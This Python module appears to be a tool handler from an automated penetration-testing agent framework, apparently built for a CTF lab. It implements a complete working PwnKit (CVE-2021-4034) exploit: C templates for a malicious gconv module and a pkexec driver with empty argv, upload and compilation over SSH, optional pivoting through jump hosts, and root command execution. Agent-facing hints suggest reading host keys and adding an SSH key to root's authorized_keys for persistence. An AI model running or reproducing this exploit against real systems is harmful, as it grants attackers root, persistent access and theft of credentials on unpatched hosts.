"""Durable ``nexus.post.pwnkit`` handler: CVE-2021-4034 over SSH.

Theseus ends on ``Labyrinth.lxd``: the only foothold is ``entrance:Knossos`` and
the flags live in other users' homes, so the run needs *local* root on a host it
only reaches with SSH. That box is Ubuntu 18.04 with a setuid ``pkexec``, and the
privilege boundary is PwnKit.

``searchsploit`` has no entry for CVE-2021-4034 (measured on the operator host)
and the Metasploit module needs a session the run does not have, so without this
handler the chain stops at "linpeas says pkexec is vulnerable" with no way to
turn it into a shell.

The exploit is the published one, in three files, and it changes nothing of the
target's configuration:

* ``pwnkit.c`` - a gconv module whose ``gconv_init`` runs the command as root;
* ``gconv-modules`` - registers ``PWNKIT//`` so glibc loads that module;
* ``driver.c`` - ``execve("/usr/bin/pkexec", {NULL}, envp)`` with
  ``GCONV_PATH=.`` and ``CHARSET=PWNKIT``. Passing an empty ``argv`` is the
  flaw: ``pkexec`` reads ``argv[1]`` out of bounds (it is the first environment
  string) and passes it to ``g_printerr``, which converts it through the
  attacker's module.

The command travels base64-free: it is baked into the C source at build time and
escaped, so a quote in the operator's command can never break the source. The
three files are written over SFTP, compiled on the target with the target's
``gcc`` (PwnKit needs a shared object, so a compiler is mandatory) and run
through the same SSH channel.

Verification is deterministic: the exploit only counts as ``verified`` when the
nonce-delimited block reports ``uid=0(root)``. A patched ``pkexec`` prints its
usage and the run gets an honest ``pwnkit_no_root`` instead of a false finding.
"""

from __future__ import annotations

import json
import os
import re
from typing import Any
from uuid import uuid4

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment

from ._exec import run_in_sandbox

PWNKIT_TOOL_ID = "nexus.post.pwnkit"
PWNKIT_ALLOWED_PROGRAMS = ("python3",)
PWNKIT_DEFAULT_PORT = 22
PWNKIT_DEFAULT_TIMEOUT_SECONDS = 180
PWNKIT_MAX_TIMEOUT_SECONDS = 600
PWNKIT_MAX_COMMAND_CHARS = 1024
PWNKIT_DEFAULT_COMMAND = "id; cat /root/root.txt 2>/dev/null; cat /root/flag.txt 2>/dev/null"
PWNKIT_RESULT_MARKER = "__NEXUS_PWNKIT__"
PWNKIT_ACTIONS = ("check", "exploit")

#: Where the three files live on the target. A dot-directory under ``/tmp``
#: keeps them out of the way and is removed after the run.
PWNKIT_DIR_TEMPLATE = "/tmp/.omni_pwnkit_{suffix}"

FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,}\{[^}\n]{1,160}\}")

#: The gconv module glibc loads as root. ``setgid`` goes first: after ``setuid``
#: the process can no longer change its group.
PWNKIT_MODULE_TEMPLATE = """#include <stdlib.h>
#include <unistd.h>

void gconv(void) {{}}

int gconv_init(void *step) {{
    (void)step;
    setgid(0);
    setuid(0);
    system("{command}");
    _exit(0);
    return 0;
}}
"""

#: ``argv`` has a single NULL element, so ``argc == 0``: that is the flaw.
#: ``execve`` returns only when it fails, and then the exit code is 127.
PWNKIT_DRIVER_TEMPLATE = """#include <unistd.h>

int main(void) {{
    char *argv[] = {{(char *)0}};
    char *envp[] = {{"GCONV_PATH=.", "CHARSET=PWNKIT", "PATH=.", "SHELL=/bin/sh", (char *)0}};
    execve("/usr/bin/pkexec", argv, envp);
    return 127;
}}
"""

#: glibc maps ``CHARSET=PWNKIT`` to the module directory; the ``FROM TO`` order
#: matters (the conversion is FROM PWNKIT TO UTF-8), measured against iconv.
PWNKIT_GCONV_MODULES = "module\tPWNKIT//\tUTF-8//\tPWNKIT\t1\n"

#: Probe run by ``action="check"``: it *reads* and changes nothing.
PWNKIT_PROBE_COMMAND = (
    "ls -l /usr/bin/pkexec 2>&1; "
    "/usr/bin/pkexec --version 2>&1 | head -2; "
    "( . /etc/os-release 2>/dev/null && echo \"$PRETTY_NAME\" ); "
    "uname -m"
)

#: Client executed in the sandbox (``paramiko`` + SFTP). argv after ``-c``:
#: mode host port user password payload_json. It only transports files and
#: commands: the sources and the verdict are built here, so the client stays
#: dumb and the answer stays testable without a target.
PWNKIT_CLIENT_SCRIPT = r"""
import json, sys


def emit(payload):
    print(json.dumps(payload))


def run(client, command, timeout):
    stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
    out = stdout.read().decode("utf-8", "replace")
    err = stderr.read().decode("utf-8", "replace")
    code = stdout.channel.recv_exit_status()
    return out, err, code


def connect(client, host, port, username, password, timeout, sock=None):
    client.set_missing_host_key_policy(__import__("paramiko").AutoAddPolicy())
    client.connect(hostname=host, port=int(port), username=username,
                   password=password, timeout=timeout, banner_timeout=timeout,
                   auth_timeout=timeout, allow_agent=False, look_for_keys=False,
                   sock=sock)


def main():
    mode, host, port, username, password, payload_raw = sys.argv[1:7]
    payload = json.loads(payload_raw)
    result = {"ok": False, "mode": mode, "host": host, "username": username}
    try:
        import paramiko
    except Exception as exc:
        emit({"ok": False, "mode": mode, "error": "ssh_unavailable", "detail": str(exc)})
        return
    jump = None
    client = None
    sftp = None
    try:
        timeout = int(payload.get("timeout") or 60)
        sock = None
        jump = payload.get("jump") or None
        if jump:
            jumper = paramiko.SSHClient()
            connect(jumper, jump["host"], jump.get("port", 22), jump["username"],
                    jump["password"], timeout)
            transport = jumper.get_transport()
            if transport is None or not transport.is_active():
                raise RuntimeError("jump channel is not active")
            sock = transport.open_channel(
                "direct-tcpip", (host, int(port)), ("127.0.0.1", 0)
            )
            result["jump"] = {"host": jump["host"], "port": jump.get("port", 22)}
            result["_jumper"] = jumper
        client = paramiko.SSHClient()
        connect(client, host, port, username, password, timeout, sock=sock)
        result["connected"] = True
        if mode == "check":
            out, err, code = run(client, payload.get("probe") or "id", timeout)
            result.update({"ok": True, "stdout": out, "stderr": err, "exit_status": code})
        else:
            directory = payload["dir"]
            run(client, "mkdir -p %s && chmod 700 %s" % (directory, directory), timeout)
            sftp = client.open_sftp()
            for name, text in (
                ("pwnkit.c", payload["module_source"]),
                ("driver.c", payload["driver_source"]),
                ("gconv-modules", payload["gconv_modules"]),
            ):
                with sftp.file("%s/%s" % (directory, name), "wb") as handle:
                    handle.write(text.encode("utf-8"))
            build = (
                "cd %s && if ! command -v gcc >/dev/null 2>&1; then "
                "echo NEXUS_NO_GCC; exit 90; fi; "
                "gcc -shared -fPIC -o PWNKIT.so pwnkit.c && gcc -o run driver.c"
            ) % directory
            build_out, build_err, build_code = run(client, build, timeout)
            result["compile"] = {
                "exit_status": build_code,
                "stdout": build_out[-2000:],
                "stderr": build_err[-2000:],
            }
            if build_code == 90 or "NEXUS_NO_GCC" in build_out:
                result["error"] = "no_gcc"
                result["detail"] = "the target has no gcc; PwnKit needs a shared object"
            elif build_code != 0:
                result["error"] = "compile_failed"
                result["detail"] = build_err[-1000:] or build_out[-1000:]
            else:
                run_out, run_err, run_code = run(
                    client,
                    "cd %s && GCONV_PATH=. CHARSET=PWNKIT ./run" % directory,
                    timeout,
                )
                result.update(
                    {
                        "ok": True,
                        "stdout": run_out,
                        "stderr": run_err,
                        "exit_status": run_code,
                    }
                )
            run(client, "rm -rf %s" % directory, timeout)
            result["cleaned"] = True
    except Exception as exc:
        result.setdefault("error", "transport_failed")
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if sftp is not None:
            try:
                sftp.close()
            except Exception:
                pass
        if client is not None:
            try:
                client.close()
            except Exception:
                pass
        jumper = result.pop("_jumper", None)
        if jumper is not None:
            try:
                jumper.close()
            except Exception:
                pass
    emit(result)


main()
"""


def _validate_text(value: Any, field: str, *, max_length: int) -> str:
    text = str(value or "").strip()
    if not text:
        raise ValueError(f"{field} is required")
    if len(text) > max_length:
        raise ValueError(f"{field} is too long")
    if any(ord(char) < 0x20 or ord(char) == 0x7F for char in text):
        raise ValueError(f"{field} contains control characters")
    return text


def _validate_command(value: Any) -> str:
    command = str(value if value is not None else PWNKIT_DEFAULT_COMMAND)
    if not command.strip():
        raise ValueError("command is required")
    if len(command) > PWNKIT_MAX_COMMAND_CHARS:
        raise ValueError("command is too long")
    if any(ord(char) < 0x20 for char in command):
        raise ValueError("command contains control characters")
    return command


def _c_string(text: str) -> str:
    """Escape ``text`` so it is a safe C string literal body."""
    return (
        str(text)
        .replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\r", "")
        .replace("\n", "\\n")
    )


def _connection_args(arguments: dict) -> tuple[str, str, str, int]:
    target = _validate_text(arguments.get("target"), "target", max_length=255)
    username = _validate_text(arguments.get("username"), "username", max_length=128)
    password = str(arguments.get("password") or "")
    if not password:
        raise ValueError("password is required")
    port = int(arguments.get("port") or PWNKIT_DEFAULT_PORT)
    if not 1 <= port <= 65535:
        raise ValueError("port must be between 1 and 65535")
    return target, username, password, port


def _jump_args(arguments: dict) -> dict[str, Any] | None:
    host = str(arguments.get("jump_host") or "").strip()
    if not host:
        return None
    return {
        "host": _validate_text(host, "jump_host", max_length=255),
        "port": int(arguments.get("jump_port") or PWNKIT_DEFAULT_PORT),
        "username": _validate_text(
            arguments.get("jump_username"), "jump_username", max_length=128
        ),
        "password": str(arguments.get("jump_password") or ""),
    }


def _clamp_timeout(value: Any) -> int:
    try:
        requested = int(value) if value is not None else PWNKIT_DEFAULT_TIMEOUT_SECONDS
    except (TypeError, ValueError):
        requested = PWNKIT_DEFAULT_TIMEOUT_SECONDS
    return min(PWNKIT_MAX_TIMEOUT_SECONDS, max(20, requested))


async def _run_client(
    *, mode: str, host: str, port: int, username: str, password: str,
    payload: dict[str, Any], timeout_seconds: int,
) -> Any:
    argv = [
        "python3", "-c", PWNKIT_CLIENT_SCRIPT, mode, host, str(port),
        username, password, json.dumps(payload),
    ]
    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    sandbox = sandbox_for_environment(
        workspace_root, allowed_programs=PWNKIT_ALLOWED_PROGRAMS
    )
    return await run_in_sandbox(
        sandbox, argv, timeout_seconds=timeout_seconds,
        image_env="NEXUS_PWN_IMAGE", default_image="python:3.12-alpine",
    )


def _parse_client_json(stdout: str, stderr: str = "") -> dict[str, Any]:
    for line in reversed((stdout or "").splitlines()):
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            payload = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(payload, dict):
            return payload
    raise ValueError(f"pwnkit client did not return a JSON result: {(stderr or '')[-300:]}")


def _extract_block(text: str, nonce: str) -> str | None:
    start = text.find(nonce)
    if start < 0:
        return None
    start += len(nonce)
    end = text.find(nonce, start)
    if end < 0:
        return None
    return text[start:end].strip("\r\n")


def _surface_assessment(stdout: str) -> dict[str, Any]:
    """Read the ``check`` output: version, architecture and a conservative hint."""
    text = str(stdout or "")
    version_match = re.search(r"(\d+\.\d+)", text)
    version = version_match.group(1) if version_match else None
    vulnerable = bool(version and version in {"0.105", "0.106", "0.111", "0.112"})
    return {
        "pkexec": "/usr/bin/pkexec" in text,
        "version": version,
        "assessment": (
            "likely_vulnerable"
            if vulnerable
            else ("patched_or_unknown" if version else "unknown")
        ),
    }


def pwnkit_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.post.pwnkit``."""
    return ToolDefinition(
        tool_id=PWNKIT_TOOL_ID,
        effect="exploit",
        name="PwnKit (CVE-2021-4034) escalation",
        tenant_id=tenant_id,
        description=(
            "Escala a root en un host Linux por SSH con PwnKit: compila en el "
            "target un módulo gconv y lanza pkexec con argv vacío, que ejecuta "
            "el comando como root. `action=\"check\"` solo lee la versión de "
            "pkexec. Verifica con uid=0(root). Usa jump_host cuando el target "
            "solo es alcanzable desde otra máquina comprometida."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password": {"type": "string", "minLength": 1, "maxLength": 256},
                "port": {"type": "integer", "minimum": 1, "maximum": 65535},
                "action": {"type": "string", "enum": list(PWNKIT_ACTIONS)},
                "command": {"type": "string", "maxLength": PWNKIT_MAX_COMMAND_CHARS},
                "jump_host": {"type": "string", "minLength": 1, "maxLength": 255},
                "jump_port": {"type": "integer", "minimum": 1, "maximum": 65535},
                "jump_username": {"type": "string", "minLength": 1, "maxLength": 128},
                "jump_password": {"type": "string", "maxLength": 256},
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 20,
                    "maximum": PWNKIT_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["target", "username", "password"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        required_permissions=[f"execute:tool:{PWNKIT_TOOL_ID}"],
        timeout_seconds=600,
        max_output_bytes=2_000_000,
        scope_target_field="target",
        scope_required=True,
    )


async def pwnkit_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    """Check or exploit CVE-2021-4034 on an SSH-reachable host."""
    from nexus_core.kernel.schema_validation import validate

    validate(arguments, pwnkit_definition().input_schema)
    target, username, password, port = _connection_args(arguments)
    action = str(arguments.get("action") or "exploit").strip().lower()
    if action not in PWNKIT_ACTIONS:
        raise ValueError(f"action is not allowed: {action!r}")
    command = _validate_command(arguments.get("command"))
    timeout_seconds = _clamp_timeout(arguments.get("timeout_seconds"))
    jump = _jump_args(arguments)
    if jump is not None and not jump.get("password"):
        raise ValueError("jump_password is required when jump_host is set")

    evidence: dict[str, Any] = {
        "mode": action, "port": port, "username": username,
        "jump_host": (jump or {}).get("host"),
    }

    if action == "check":
        result = await _run_client(
            mode="check", host=target, port=port, username=username, password=password,
            payload={"probe": PWNKIT_PROBE_COMMAND, "timeout": min(timeout_seconds, 60),
                     "jump": jump},
            timeout_seconds=min(timeout_seconds, 120),
        )
        try:
            client = _parse_client_json(result.stdout, result.stderr)
        except ValueError as exc:
            return ToolResult(
                output={"error": str(exc), "target": target}, verified=False,
                verification_method="pwnkit_check_parse_failed", evidence=evidence,
                exit_code=result.exit_code, accepted_exit_codes=(0,),
                stdout=result.stdout, stderr=result.stderr,
            )
        if not client.get("ok"):
            return ToolResult(
                output={"error": client.get("error") or "check failed",
                        "detail": client.get("detail"), "target": target},
                verified=False, verification_method="pwnkit_check_failed",
                evidence=evidence, exit_code=result.exit_code,
                accepted_exit_codes=(0,), stdout=result.stdout, stderr=result.stderr,
            )
        surface = _surface_assessment(client.get("stdout", ""))
        evidence.update(surface)
        return ToolResult(
            output={
                "target": target,
                "surface": surface,
                "probe": (client.get("stdout") or "")[-2000:],
                "next_steps": [
                    "Si `assessment` es likely_vulnerable, lanza action=\"exploit\" "
                    "con un command que lea los flags y las claves del host."
                ],
            },
            verified=False,
            verification_method="pwnkit_surface",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    nonce = f"nexus{uuid4().hex[:12]}"
    wrapped = f"echo {nonce}; ( {command} ); echo __NEXUS_RC=$?; echo {nonce}"
    directory = PWNKIT_DIR_TEMPLATE.format(suffix=uuid4().hex[:10])
    payload = {
        "dir": directory,
        "module_source": PWNKIT_MODULE_TEMPLATE.format(command=_c_string(wrapped)),
        "driver_source": PWNKIT_DRIVER_TEMPLATE.format(),
        "gconv_modules": PWNKIT_GCONV_MODULES,
        "timeout": max(30, timeout_seconds - 30),
        "jump": jump,
    }
    result = await _run_client(
        mode="exploit", host=target, port=port, username=username, password=password,
        payload=payload, timeout_seconds=timeout_seconds,
    )
    if result.timed_out:
        return ToolResult(
            output={"error": "exploit timed out", "target": target}, verified=False,
            verification_method="pwnkit_timeout", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr, timed_out=True,
        )
    try:
        client = _parse_client_json(result.stdout, result.stderr)
    except ValueError as exc:
        return ToolResult(
            output={"error": str(exc), "target": target}, verified=False,
            verification_method="pwnkit_parse_failed", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr,
        )
    evidence["compile"] = client.get("compile")
    evidence["run_exit"] = client.get("exit_status")
    if not client.get("ok"):
        error = client.get("error") or "transport_failed"
        next_steps = [
            "Comprueba que las credenciales abren SSH (`nexus.post.ssh_exec`) y "
            "que el host es Linux; PwnKit no aplica a Windows ni a pkexec parcheado."
        ]
        if error == "no_gcc":
            next_steps = [
                "El target no tiene gcc: compila el .so en otra máquina con la "
                "misma arquitectura y súbelo, o usa el módulo de Metasploit "
                "(nexus.exploit.msf_search / msf_exploit) con una sesión existente.",
            ]
        return ToolResult(
            output={
                "error": error,
                "detail": client.get("detail"),
                "target": target,
                "compile": client.get("compile"),
                "next_steps": next_steps,
            },
            verified=False,
            verification_method=f"pwnkit_{error}",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    stdout = str(client.get("stdout") or "")
    block = _extract_block(stdout, nonce) or stdout
    uid_root = bool(re.search(r"uid=0\(root\)", block))
    flag = FLAG_RE.search(block)
    returncode = re.search(r"__NEXUS_RC=(\d+)", block)
    output = block.replace(returncode.group(0), "").strip("\r\n") if returncode else block
    evidence.update(
        {
            "uid_root": uid_root,
            "flag": flag.group(0) if flag else None,
            "output_tail": output[-2000:],
        }
    )
    return ToolResult(
        output={
            "target": target,
            "ui": "root" if uid_root else "unprivileged",
            "output": output[-8000:],
            "flag": flag.group(0) if flag else None,
            "returncode": int(returncode.group(1)) if returncode else None,
            "next_steps": (
                ["Eres root: lee /root, los homes de otros usuarios y añade tu "
                 "clave a /root/.ssh/authorized_keys si necesitas una sesión "
                 "interactiva (nexus.post.ssh_upload / ssh_exec)."]
                if uid_root
                else ["Sin uid=0: pkexec está parcheado o el host no es vulnerable; "
                      "registra un barrier y pivota a otro vector de escalada "
                      "(nexus.post.privesc_hints)."]
            ),
        },
        verified=uid_root,
        verification_method="pwnkit_root_command" if uid_root else "pwnkit_no_root",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


__all__ = [
    "PWNKIT_CLIENT_SCRIPT",
    "PWNKIT_DRIVER_TEMPLATE",
    "PWNKIT_GCONV_MODULES",
    "PWNKIT_MODULE_TEMPLATE",
    "PWNKIT_TOOL_ID",
    "pwnkit_definition",
    "pwnkit_handler",
]
